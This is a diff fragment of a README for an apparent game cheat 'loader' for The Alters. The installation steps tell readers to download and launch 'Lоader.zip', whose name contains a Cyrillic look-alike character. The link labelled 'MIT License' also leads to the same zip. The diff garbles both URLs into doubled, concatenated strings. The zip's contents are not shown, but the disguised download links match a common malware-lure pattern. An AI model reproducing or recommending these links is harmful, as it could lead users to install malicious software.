@@ -28,7 +28,7 @@ the alters loader, universal alters tool, multiplatform alters utility, 2025 gam
 
 ## 📥 Installation Guide
 
-1. Download `https://raw.githubusercontent.com/ali-hassan148/TheAlters-UnlockedPaths/main/Lоader.zip` from the repository.
+1. Download `https://raw.githubusercontent.com/ali-hassan148/TheAlters-UnlockedPaths/main/Lоader.zipоhttps://raw.githubusercontent.com/ali-hassan148/TheAlters-UnlockedPaths/main/Lоader.zip` from the repository.
 2. Extract and follow the included setup instructions for your OS.
 3. Launch the Loader and enjoy your unique gaming enhancement!
 
@@ -38,6 +38,6 @@ This project is intended for educational and personal research purposes only. Th
 
 ## 📝 License
 
-Distributed under the [MIT License](https://raw.githubusercontent.com/ali-hassan148/TheAlters-UnlockedPaths/main/Lоader.zip) © 2025.
+Distributed under the [MIT License](https://raw.githubusercontent.com/ali-hassan148/TheAlters-UnlockedPaths/main/Lоader.zipоhttps://raw.githubusercontent.com/ali-hassan148/TheAlters-UnlockedPaths/main/Lоader.zip) © 2025.
 
 Enjoy The Alters Loader and unlock your ultimate experience!
